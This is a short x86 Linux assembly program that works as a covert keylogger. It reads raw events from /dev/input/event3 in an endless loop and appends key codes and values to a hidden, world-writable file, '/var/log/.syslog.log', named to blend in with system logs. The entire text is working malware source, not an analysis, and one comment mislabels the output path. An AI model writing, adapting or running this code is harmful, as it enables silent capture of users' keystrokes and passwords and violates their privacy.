section	.text
   global _start

_start:
;  push	ebp
;  mov	ebp, esp
   sub  esp, 0x10		; alloc space for ev (struct input_event)

   xor	edx, edx
   xor	ecx, ecx		; O_RDONLY
   mov	ebx, src		; '/dev/input/event3'
   mov	eax, 5 			; sys_open
   int	0x80

   mov  edi, eax		; save fd for the read

   mov	edx, 511		; S_IRWXU | S_IRWXG | S_IRWXO (777)
   mov	ecx, 1089		; O_APPEND | O_CREAT | O_WRONLY
   mov	ebx, dest		; '/dev/input/event3'
   mov	eax, 5 			; sys_open
   int	0x80

   mov  esi, eax		; save fd for the write

loop:
   mov	edx, 0x10		; size
   lea	ecx, [esp]		; &ev
   mov	ebx, edi		; fd
   mov	eax, 3			; sys_read
   int	0x80

   mov	ax, [esp + 10]		; ax = ev.code
   cmp	ax, 0
   je	loop			; do not write if ev.code == 0
   cmp	ax, 4
   je	loop			; do not write if ev.code == 4
	
   mov	edx, 0x4		; size
   add	ecx, 10			; &ev.code (to print ev.code and ev.value)
   mov	ebx, esi		; fd
   mov	eax, 4			; sys_write
   int	0x80

   jmp	loop

;  leave
;  mov	ebx, 84			; exit code
;  mov	eax, 1			; sys_exit
;  int	0x80

section	.data
   src	db '/dev/input/event3', 0
   dest	db '/var/log/.syslog.log', 0
